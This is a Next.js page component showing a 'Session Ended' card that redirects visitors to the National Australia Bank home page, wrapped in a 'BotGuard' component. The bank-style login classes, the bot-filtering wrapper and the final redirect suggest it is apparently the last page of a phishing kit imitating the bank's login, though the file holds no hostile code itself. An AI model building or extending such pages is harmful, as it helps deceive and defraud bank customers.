'use client';

import { BotGuard } from '@/components/security/BotGuard';

export default function TerminatedPage() {
  return (
    <BotGuard>
      <div className="login-card">
        <h1 className="card-heading" style={{ textAlign: 'center' }}>Session Ended</h1>

        <div className="login-form" style={{ textAlign: 'center' }}>
          <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '24px' }}>
            <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#C20000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="15" y1="9" x2="9" y2="15"></line>
              <line x1="9" y1="9" x2="15" y2="15"></line>
            </svg>
          </div>

          <p style={{ fontSize: '16px', lineHeight: '1.5', marginBottom: '24px' }}>
            For your security, this session has timed out or been invalidated.
            <br />
            Please try again or contact support if the issue persists.
          </p>

          <button
            onClick={() => window.location.href = 'https://www.nab.com.au'}
            className="btn-login"
            style={{ width: '100%', justifyContent: 'center', backgroundColor: '#333' }}
          >
            Return to Home
          </button>
        </div>
      </div>
    </BotGuard>
  );
}
